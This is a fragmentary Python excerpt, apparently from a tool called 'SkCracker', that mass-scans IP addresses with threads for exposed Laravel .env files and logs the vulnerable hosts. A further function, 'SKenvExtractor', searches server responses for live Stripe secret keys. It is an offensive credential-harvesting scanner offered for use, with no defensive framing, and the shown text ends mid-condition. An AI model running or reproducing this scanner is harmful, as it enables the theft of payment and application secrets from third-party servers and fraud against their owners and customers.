...
def main():
    ...
    if selection == '1':
        ...
        threads = []
        for i in range(thrds):
            t = threading.Thread(target=fastenvcheck)
            t.daemon = True
            threads.append(t)
    ...
    while True:
        ...
        try:
            ...
            if "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                ...
                open('liveipwithenv.txt', 'a').write(ip + '\n')
    ...
    while True:
        ...
        try:
            ...
            for PATHS in URLPATH:
                r = requests.get(f'{ip}{PATHS}', timeout=1)
                if "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                    print(f'SkCracker » [+] {ip} FOUND ENV')
...
def SKenvExtractor():
    while True:
        ...
        try:
            ...
            r = requests.get(f'{ip}', timeout=1)
            if "sk_live" in r.text or "STRIPE_KEY" in r.text or "STRIPE_SECRET" in r.text:
